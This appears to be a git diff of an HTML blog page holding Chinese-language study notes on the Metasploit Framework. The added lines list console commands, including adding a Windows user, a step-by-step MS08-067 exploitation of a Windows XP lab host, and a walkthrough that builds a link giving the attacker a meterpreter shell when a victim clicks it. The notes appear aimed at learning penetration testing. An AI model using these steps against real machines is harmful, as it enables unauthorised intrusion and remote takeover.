@@ -172,7 +172,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="网络安全学习"><a href="#网络安全学习" class="headerlink" title="网络安全学习"></a>网络安全学习</h1><h2 id="MSF学习"><a href="#MSF学习" class="headerlink" title="MSF学习"></a>MSF学习</h2><h3 id="MSF介绍"><a href="#MSF介绍" class="headerlink" title="MSF介绍"></a>MSF介绍</h3><p>全名The Metasploit Framework 即漏洞框架 ，自带攻击工具</p>
+        <h2 id="MSF学习"><a href="#MSF学习" class="headerlink" title="MSF学习"></a>MSF学习</h2><h3 id="MSF介绍"><a href="#MSF介绍" class="headerlink" title="MSF介绍"></a>MSF介绍</h3><p>全名The Metasploit Framework 即漏洞框架 ，自带攻击工具</p>
 <h3 id="MSF术语"><a href="#MSF术语" class="headerlink" title="MSF术语"></a>MSF术语</h3><ol>
 <li>exploit &emsp;&emsp;&emsp;攻击行为</li>
 <li>payloads&emsp;&emsp;&emsp;攻击载荷即攻击代码</li>
@@ -205,6 +205,37 @@
 <li>进入kali中msf的目录&emsp;&emsp;cd metasploit -framework  </li>
 <li>在9的前提下，在目录中查看目录下的文件名称&emsp;&emsp; ls查看所有模块</li>
 <li>返回上一级目录&emsp;&emsp;&emsp; cd..</li>
+<li>show options &emsp;&emsp;&emsp;可提供操作提示，与info差不多  </li>
+<li>back：返回命令  </li>
+<li>set：给一个变量赋值  </li>
+<li>net user：查看当前所有用户  </li>
+<li>net user test test /add：添加用户  </li>
+<li>session -i ：查看攻击后返回的信息  </li>
+<li>ifconfig：linux系统中查看ip地址命令</li>
+</ol>
+<h3 id="MSF渗透测试一"><a href="#MSF渗透测试一" class="headerlink" title="MSF渗透测试一"></a>MSF渗透测试一</h3><p>攻击xp系统，注意是sp2chinese版本的  </p>
+<ol>
+<li>msfconsole &emsp;&emsp;&emsp;进入msf  </li>
+<li>search ms08-067  &emsp;&emsp;&emsp;搜索漏洞  </li>
+<li>use exploit/windows/smb/ms08_067_netapi &emsp;&emsp;使用该漏洞  </li>
+<li>show options &emsp;&emsp;&emsp;展示使用方法，看reqiured选项如果是yes是必须设置的，flase则可以不设置   </li>
+<li>set RHOST 192.168.80.128：设置被攻击者的ip  </li>
+<li>info：查看该所有可以被攻击的系统版本 并且在base options中查   </li>
+<li>check：检查该目标主机能够被攻击  </li>
+<li>exploit：使用该命令开始攻击</li>
+</ol>
+<p>###MSF渗透测试二<br>利用自己创建链接获取控制其他计算机的权限    </p>
+<ol>
+<li>同上  </li>
+<li>同上  </li>
+<li>同上  </li>
+<li>同上  </li>
+<li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li>
+<li>set PAYLOADS windows/meterpreter/bind_tcp  </li>
+<li>show options： 查看payloads的使用方法  </li>
+<li>run:  运行后出现url地址，复制，作为一个链接  </li>
+<li>当有计算机点击该链接时，kali后台就会返回successful  </li>
+<li>接下来就可以拿shell了，控制目标计算机</li>
 </ol>
 <hr>
 
